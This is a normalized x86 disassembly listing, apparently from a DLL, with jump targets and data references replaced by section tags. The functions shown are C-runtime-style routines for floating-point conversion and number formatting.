imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_1000df42
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_10017f0c
pop ecx
mov ebx eax
call sub_1000ecdb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0xc
call sub_1000d8e6
add esp 0x14
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_1000fe10
add esp 0xc
sub_1001942d
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_10019971
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_10019eb5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1000d1a7
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_1001433d
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_1000d9f3
test eax eax
movsx eax [ esi ]
push eax
call sub_1001433d
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
inc esi
inc esi
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10019f28
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1000d1a7
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_10019faa
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_10019fc6
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_1001b405
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_1001b35d
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_1001a022
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_10014440
inc eax
push eax
push esi
add esi edi
push esi
call sub_1000cb70
add esp 0x10
sub_1001a067
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_1000d1a7
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebp + 0x8 ] esi
jbe r-xdata
call sub_1000ecdb
push 0x16
cmp [ ebp + 0xc ] esi
jle r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] 0x0
je r-xdata
call sub_1000ecdb
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] esi
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_1001a022
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_1000d8e6
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
lea eax [ esi + 0x1 ]
mov cl [ eax ]
mov [ esi ] cl
mov esi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000d7be
add esp 0x14
push r--data
push ebx
push esi
call sub_100143d1
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
inc esi
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
inc esi
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi ] 0x2d
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_1000cb70
add esp 0xc
inc esi
cmp eax 0xa
jl r-xdata
cdq
